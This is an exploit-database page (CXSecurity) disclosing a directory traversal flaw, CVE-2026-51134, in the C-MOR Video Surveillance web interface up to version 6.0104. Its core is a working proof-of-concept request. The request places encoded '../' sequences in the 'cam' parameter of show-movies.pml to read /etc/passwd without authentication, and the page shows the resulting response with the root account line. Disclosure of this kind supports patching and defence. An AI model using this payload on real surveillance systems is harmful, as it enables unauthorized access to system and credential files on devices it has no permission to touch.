---
title: C-MOR  6.0104 Directory Traversal
url: https://cxsecurity.com/issue/WLB-2026090004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-06
fetch_date: 2026-09-07T06:48:03.938653
---

# C-MOR  6.0104 Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **C-MOR 6.0104 Directory Traversal** **2026.09.06**  Credit:  **[Fadi Kaakahji](https://cxsecurity.com/author/Fadi%2BKaakahji/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-51134](https://cxsecurity.com/cveshow/CVE-2026-51134/ "Click to see CVE-2026-51134")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Exploit Title: C-MOR 6.0104 - Directory Traversal
# Google Dork: N/A
# Date: 2026-07-23
# Exploit Author: Fadi Kaakahji (Alb Cyber Guards)
# Vendor Homepage: https://www.c-mor.com
# Software Link: https://www.c-mor.com/
# Version: <= 6.0104
# Tested on: C-MOR Video Surveillance V6.0104
# CVE: CVE-2026-51134
# 1. Description:
# The C-MOR Video Surveillance web interface (up to version 6.0104) by za-internet GmbH
# is vulnerable to Directory/Path Traversal. Unauthenticated attackers can access
# arbitrary system files via specially crafted HTTP requests using directory
# traversal sequences (e.g., '../') in the 'cam' parameter of the show-movies.pml component.
# 2. Proof of Concept (PoC):
# Retrieve the /etc/passwd file from the target server:
http://[TARGET]/show-movies.pml?cam=cam5..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&days=1100
# Vulnerable Code in Response (Example for /etc/passwd):
# <span class=hl>&nbsp;Aufnahmen Kamera 5../../../../../../../../../../../../../../../../etc/passwd, Standort: root:x:0:0:root:/root:/bin/bash</span>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026090004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top